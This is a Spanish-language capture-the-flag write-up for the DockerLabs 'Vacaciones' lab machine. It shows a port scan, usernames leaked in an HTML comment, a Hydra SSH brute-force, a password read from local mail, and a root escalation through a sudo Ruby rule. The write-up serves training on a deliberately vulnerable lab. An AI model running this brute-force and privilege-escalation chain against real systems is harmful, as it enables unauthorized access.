# Vacaciones - DockerLabs

## Resumen
Máquina de nivel "Fácil" de DockerLabs que explota un comentario en el código fuente para obtener usuarios, fuerza bruta SSH, lectura de correo local y una mala configuración de sudo con Ruby para escalar a root.

## Reconocimiento
- **Escaneo de puertos**: `nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2 -oN allPorts`
- **Puertos abiertos**: 22/tcp (SSH), 80/tcp (HTTP)
- **Servicios**: OpenSSH (Ubuntu), Apache httpd

## Enumeración
- **Web**: La página principal aparecía en blanco, pero al revisar el código fuente (Ctrl+U) encontré un comentario:
  ```html
  <!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->

## Explotación
Fuerza Bruta SSH: Creé una lista de usuarios (juan, camilo) y usé Hydra con una lista corta de contraseñas comunes:
hydra -L users.txt -P pass.txt ssh://172.17.0.2 -t 4
→ Credenciales encontradas: camilo:password1

- Acceso SSH: ssh camilo@172.17.0.2 (contraseña: password1)

- Lectura de correo: Dentro del sistema, leí el correo de camilo:
 cat /var/mail/camilo/correo.txt
Contenido: contraseña de juan: 2k84dicb

## Escalada de Privilegios
- Cambio de usuario: su juan (contraseña: 2k84dicb)
- Sudo: sudo -l mostró que juan podía ejecutar Ruby como root sin contraseña:
(ALL) NOPASSWD: /usr/bin/ruby
- Explotación de Ruby (GTFOBins):
  sudo ruby -e 'exec "/bin/sh"'
→ Shell como root.

## Evidencia
<img width="266" height="46" alt="image" src="https://github.com/user-attachments/assets/1505c901-4289-42c6-a50e-3a9c37e5c549" />
